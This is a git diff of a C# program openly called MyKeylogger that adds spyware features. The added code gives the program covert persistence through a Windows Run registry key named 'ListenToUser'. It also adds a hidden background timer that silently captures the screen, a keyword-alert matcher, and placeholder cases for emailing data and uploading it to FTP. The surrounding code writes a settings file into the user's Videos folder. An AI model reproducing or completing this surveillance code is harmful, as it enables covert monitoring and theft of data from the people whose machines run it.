@@ -1,4 +1,5 @@
-﻿using MyKeylogger.Lib.HotKeys;
+﻿using Microsoft.Win32;
+using MyKeylogger.Lib.HotKeys;
 using System;
 using System.Collections.Generic;
 using System.Drawing;
@@ -7,6 +8,7 @@ using System.IO;
 using System.Linq;
 using System.Runtime.InteropServices;
 using System.Text;
+using System.Threading;
 using System.Threading.Tasks;
 using System.Windows.Forms;
 
@@ -54,15 +56,22 @@ namespace tt
             File.Create(Environment.GetFolderPath(Environment.SpecialFolder.MyVideos) + "\\myKeylogger.ini").Dispose();
             // File.Create(Environment.GetFolderPath(Environment.SpecialFolder.MyVideos) + "\\myKeylogger.ini", FileAttributes.Hidden);
         }
-
+        // not complete
         public static void SetHotKey()
         {
             HotKeySet hks = new HotKeySet(new[] { Keys.T, Keys.LShiftKey, Keys.RShiftKey });
             hks.RegisterExclusiveOrKey(new[] { Keys.LShiftKey, Keys.RShiftKey });
             //if(is)
         }
-
-        public static void ScreenShotSingleScreen(string imagePath, Int64 quality, int imageCount, string imageExtendtion, bool Timestamp_Username)
+        /// <summary>
+        ///  capture screen
+        /// </summary>
+        /// <param name="imagePath"></param>
+        /// <param name="quality"></param>
+        /// <param name="imageCount"></param>
+        /// <param name="imageExtendtion"></param>
+        /// <param name="Timestamp_Username"></param>
+        public static void ScreenShotSingleScreen(string imagePath, int imageCount, Int64 quality = 100, string imageExtendtion = ".jpeg", bool Timestamp_Username = false)
         {
             var bmpScreenshot = new Bitmap(Screen.PrimaryScreen.Bounds.Width,
                                        Screen.PrimaryScreen.Bounds.Height,
@@ -147,6 +156,113 @@ namespace tt
         }
 
 
+        /// Screen Recording video
+        /// 
 
+        /// Alerts
+        /// 
+        public static bool isAlerts(List<string> alertList, string word)
+        {
+
+            for (int i = 0; i < alertList.Count; i++)
+            {
+                string s = alertList.ElementAt(i);
+               
+                if (word.ToLower() == s.ToLower())
+                {
+                    return true;
+                }
+            }
+
+            return false;
+        }
+
+        /// <summary>
+        /// run as start up
+        /// </summary>
+        public static void RunStartUp()
+        {
+            RegistryKey regkey = Registry.CurrentUser.CreateSubKey("Software\\ListenToUser");
+            RegistryKey regstart = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run");
+            string keyvalue = "1";
+            try
+            {
+                regkey.SetValue("Index", keyvalue);
+                regstart.SetValue("ListenToUser", Application.StartupPath + "\\" + Application.ProductName + ".exe");
+                regkey.Close();
+            }
+            catch (System.Exception ex)
+            {
+
+            }
+        }
+        /// <summary>
+        /// disable run as start up
+        /// </summary>
+        public static void DontRunStartUp()
+        {
+            RegistryKey regkey = Registry.CurrentUser.OpenSubKey("Software\\ListenToUser", true);
+            RegistryKey regstart = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
+
+            try
+            {
+                regkey.DeleteValue("Index", false);
+                regstart.DeleteValue("ListenToUser", false);
+                regkey.Close();
+                regstart.Close();
+            }
+            catch (System.Exception ex)
+            {
+
+            }
+        }
+
+        /// Timing counter
+        /// sec = time need to use 
+        /// type = 1 : screenshot
+        /// type = 2 : sendmail
+        /// type = 3 : upload to ftp
+        static int interval = 1;
+        public static void StartTimmer(int sec, int type, int randnum = 0)
+        {
+            Thread thread = new Thread(() => {
+                while (true)
+                {
+                    Thread.Sleep(1);
+                    // generate random number
+                    if (randnum == 0)
+                    {
+                        Random rnd = new Random();
+                        randnum = rnd.Next();
+                    }
+                    ////
+                    if (interval % sec == 0)
+                        switch (type)
+                        {
+                            case 1:
+                                // screenshot
+                                ScreenShotSingleScreen("ScreenShot\\",randnum);
+                                break;
+                            case 2:
+                                // send mail
+                                break;
+                            case 3:
+                                // upload to ftp
+                                break;
+                        }
+                        
+                        ///CaptureScreen();
+                        ///send mail func;
+                        ///do something here
+
+                    interval++;
+
+                    if (interval >= 1000000)
+                        interval = 0;
+                }
+            });
+            thread.IsBackground = true;
+            thread.Start();
+        }
     }
 }
